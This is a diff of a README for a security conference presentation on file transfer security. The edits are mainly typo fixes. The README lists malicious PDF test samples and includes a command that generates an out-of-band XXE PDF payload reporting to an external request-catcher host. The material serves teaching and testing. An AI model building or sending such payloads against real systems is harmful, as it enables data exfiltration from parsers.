@@ -1,4 +1,4 @@
-# Presentation regarding the security aspect of an file transfer implementation
+# Presentation regarding the security aspect of a file transfer implementation
 
 [![BuildLab](https://github.com/righettod/voxxeddays-lux-2026/actions/workflows/build-lab.yml/badge.svg)](https://github.com/righettod/voxxeddays-lux-2026/actions/workflows/build-lab.yml)
 
@@ -6,7 +6,7 @@
 
 💬 This folder contains all my work for the presentation proposed to the [VOXXED LU 2026](https://luxembourg.voxxeddays.com/en/) conference and accepted.
 
-ℹ️ This presentation was also proposed the following event:
+ℹ️ This presentation was also proposed to the following event:
 
 * **Thales Cyber Meet-Up Edition 2026**:
   * <https://cybermeetup.be/>
@@ -32,23 +32,16 @@
 
 ## PDF files
 
-📦 The different PDF files used are stored in folder [pdf-samples](pdf-samples/) and named `round[sequence-id].pdf`.
+📦 The different PDF files used are stored in the folder [pdf-samples](pdf-samples/) and named `round[sequence-id].pdf`.
 
 🐞 Order to the file used, called **Round**:
 
 * **Round n°1**: File that is an EXE renamed as PDF.
 * **Round n°2**: File with JS code.
-* **Round n°3**: File with an malicious attachement.
+* **Round n°3**: File with a malicious attachment.
 * **Round n°4**: File with an XXE in XFA form: `python xfa-xxe-poc-gen.py --mode oob --scheme https --ip righettod.requestcatcher.com --port 443 -o round4.pdf`
 * **Round n°5**: File with malicious links.
 * **Round n°6**: File with malicious file hidden concatenated.
-
-## TODO
-
-* [ ] Commencer l'histoire par il était une fois…
-* [x] Mettre un marqueur viusel pour identifier quand j'expliquer le but du test.
-* [x] Convertir le passer par la fenêtre finale en passer par la fenêtre après chaque fail avec un compteur de barre vie global.  
-* [x] Compléter la partie AI avec les cas trouvé et non trouvé par Claude.
 
 ## References
 
